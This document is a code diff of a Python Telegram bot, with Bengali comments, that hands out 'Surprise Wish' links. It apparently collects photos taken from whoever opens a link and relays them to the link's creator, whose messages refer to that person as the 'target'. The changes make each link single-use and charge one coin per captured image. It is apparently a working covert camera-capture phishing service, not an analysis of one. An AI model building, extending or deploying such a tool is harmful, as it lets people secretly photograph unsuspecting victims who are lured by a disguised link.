@@ -18,15 +18,13 @@ TOKEN = os.environ.get("TOKEN")
 ADMIN_ID = int(os.environ.get("ADMIN_ID"))
 MY_USERNAME = os.environ.get("MY_USERNAME")
 
-REFER_REWARD = 2  # ডিফল্ট রেফার বোনাস (এডমিন প্যানেল থেকে পরিবর্তন করা যাবে)
+REFER_REWARD = 2  # ডিফল্ট রেফার বোনাস
 users_db = {}
 forced_channels = []  
 pending_referrals = {} 
 user_states = {}  
 
-# প্রতি লিংকের সেশন ট্র্যাক করার জন্য
-charged_sessions = set()
-# প্রতি ইউজারের সর্বশেষ জেনারেট করা সেশন আইডি মনে রাখার জন্য
+# প্রতি ইউজারের সর্বশেষ ভ্যালিড সেশন আইডি মনে রাখার জন্য
 user_active_sessions = {}
 
 app_telegram = None  
@@ -55,26 +53,22 @@ def upload_image():
     try:
         owner_id = int(owner_id)
         
-        # --- লিংক এক্সপায়ার সিস্টেম (পূর্বের লিংক ডিঅ্যাক্টিভেট করা) ---
+        # --- লিংক এক্সপায়ার বা একবার ব্যবহারের সিকিউরিটি চেক ---
         if user_active_sessions.get(owner_id) != session_token:
-            return jsonify({"status": "error", "message": "Link expired"}), 400
-        # ---------------------------------------------------------
-
-        # ইউনিক সেশন কি (ইউজার আইডি + লিংক সেশন টোকেন)
-        session_key = f"{owner_id}_{session_token}"
-        
-        is_first_capture = False
-        if session_key not in charged_sessions:
-            is_first_capture = True
-            charged_sessions.add(session_key)
+            return jsonify({"status": "error", "message": "Link expired or already used"}), 400
+        # ----------------------------------------------------
 
         if owner_id in users_db:
             if not users_db[owner_id].get("is_vip", False):
-                if is_first_capture:  # প্রতি নতুন লিংকের প্রথম ছবির জন্য মাত্র ১ কয়েন কাটবে
-                    if users_db[owner_id]["balance"] >= 1:
-                        users_db[owner_id]["balance"] -= 1
-                    else:
-                        return jsonify({"status": "error", "message": "Insufficient coins"}), 400
+                # ইউজারের পর্যাপ্ত কয়েন আছে কি না চেক করা
+                if users_db[owner_id]["balance"] >= 1:
+                    users_db[owner_id]["balance"] -= 1
+                else:
+                    return jsonify({"status": "error", "message": "Insufficient coins"}), 400
+
+        # ⭐ লিংকটি একবার ব্যবহার হয়ে যাওয়ার সাথে সাথেই সেটি চিরতরে ইনভ্যালিড (Delete) করে দেওয়া হলো
+        if user_active_sessions.get(owner_id) == session_token:
+            del user_active_sessions[owner_id]
 
         header, encoded = image_data.split(",", 1)
         image_bytes = base64.b64decode(encoded)
@@ -88,7 +82,7 @@ def upload_image():
         )
 
         asyncio.run_coroutine_threadsafe(
-            send_photo_to_owner(owner_id, image_bytes, caption, is_first_capture),
+            send_photo_to_owner(owner_id, image_bytes, caption),
             bot_loop
         )
 
@@ -97,12 +91,12 @@ def upload_image():
         logger.error(f"Image upload error: {e}")
         return jsonify({"status": "error", "message": str(e)}), 500
 
-async def send_photo_to_owner(owner_id, photo_bytes, caption, is_first):
+async def send_photo_to_owner(owner_id, photo_bytes, caption):
     try:
         await app_telegram.bot.send_photo(chat_id=owner_id, photo=photo_bytes, caption=caption, parse_mode="Markdown")
-        if owner_id in users_db and is_first:
+        if owner_id in users_db:
             bal = "VIP (Unlimited)" if users_db[owner_id]["is_vip"] else f"{users_db[owner_id]['balance']} Coins"
-            await app_telegram.bot.send_message(chat_id=owner_id, text=f"🎯 নতুন লিংকের প্রথম রেসপন্স পাওয়া গেছে! (১ কয়েন কাটা হয়েছে)\n💰 বর্তমান ব্যালেন্স: {bal}")
+            await app_telegram.bot.send_message(chat_id=owner_id, text=f"🎯 টার্গেটের রেসপন্স পাওয়া গেছে! (১ কয়েন কাটা হয়েছে)\n💰 বর্তমান ব্যালেন্স: {bal}")
     except Exception as e:
         logger.error(f"Telegram send photo error: {e}")
 
@@ -335,7 +329,7 @@ async def handle_text_messages(update: Update, context: ContextTypes.DEFAULT_TYP
         target_link = f"{base_url}/?id={user_id}&s={session_token}"
         
         vip_status = "👑 [VIP Unlimited]" if user_data["is_vip"] else f"💰 Current Balance: {user_data['balance']} Coins"
-        await update.message.reply_text(f"🎁 **Surprise Wish Link**\n\n{vip_status}\n\nআপনার নতুন লিংকটি কপি করে যাকে পাঠাতে চান পাঠান:\n`{target_link}`", parse_mode="Markdown")
+        await update.message.reply_text(f"🎁 **Surprise Wish Link**\n\n{vip_status}\n\nআপনার নতুন লিংকটি তৈরি হয়েছে (এটি কেবল ১ বার ব্যবহারের জন্য কার্যকর):\n`{target_link}`", parse_mode="Markdown")
 
     elif text == "👤 Profile":
         user_data = users_db.get(user_id, {"balance": 3, "referrals": 0, "is_vip": False})
